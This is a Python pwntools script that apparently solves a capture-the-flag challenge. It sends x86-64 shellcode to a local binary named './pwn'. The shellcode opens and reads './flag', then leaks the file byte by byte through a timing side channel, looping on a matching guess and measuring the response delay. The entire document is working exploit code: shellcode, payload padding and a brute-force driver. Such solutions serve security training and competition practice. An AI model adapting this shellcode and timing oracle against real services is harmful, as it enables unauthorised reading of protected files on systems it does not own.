from pwn import *
import time
context(arch = 'amd64', os = 'linux')


def exp(io, idx, ch):
	"""
	fd = open('./flag', 0)
	read(fd, buf, 0x50)
	"""
	shellcode = '''
		push 0x10039
		pop rdi
		xor esi, esi
		push 2
		pop rax
		syscall
		
		mov rdi, rax
		push 0x10040
		pop rsi
		push 0x50
		pop rdx
		xor rax, rax
		syscall
		loop:
		cmp byte ptr[rsi+{0}], {1}
		jz loop
		ret
	'''.format(idx, ch)
	payload = asm(shellcode).ljust(0x40-7, b'A') + b'./flag\x00'
	io.sendafter(b'box.\n', payload)
	
def pwn():
	idx = 0
	last = 'A'
	flag = ''
	while True:
		for ch in range(32, 127):
			io = process("./pwn")
			exp(io, idx, ch)	
			start = time.time()
			try:
				io.recv(timeout=2)
			except:
				pass
			io.close()
			end = time.time()
			if end - start > 1.5:
				flag += chr(ch)
				last  = chr(ch)
				print(flag)
				break
		if last == '}':
			break
		idx += 1
		
	

if __name__ == "__main__":
	pwn()
